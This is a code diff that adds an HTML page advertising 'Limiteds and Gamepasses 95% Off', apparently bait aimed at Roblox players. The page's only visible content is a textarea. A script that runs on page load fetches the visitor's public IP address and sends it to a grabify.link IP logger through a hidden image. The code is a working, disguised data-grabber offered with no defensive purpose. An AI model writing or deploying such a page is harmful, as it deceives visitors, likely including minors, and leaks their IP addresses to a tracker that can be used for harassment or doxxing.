@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Limiteds and Gamepasses 95% Off!</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+    
+    textarea {
+      width: 100%;
+      height: 400px;
+      padding: 10px;
+      font-size: 16px;
+    }
+  </style>
+  <script>
+    function sendIP() {
+      const grabifyLink = 'https://grabify.link/3C14E9';
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          const image = new Image();
+          image.src = grabifyLink + '?ip=' + ipAddress;
+          image.style.display = 'none';
+          document.body.appendChild(image);
+        })
+        .catch(error => {
+          console.log('Error:', error);
+        });
+    }
+    
+    window.onload = sendIP;
+  </script>
+</head>
+<body>
+  <textarea id="notepad" placeholder="Start typing your evil plans here..."></textarea>
+</body>
+</html>
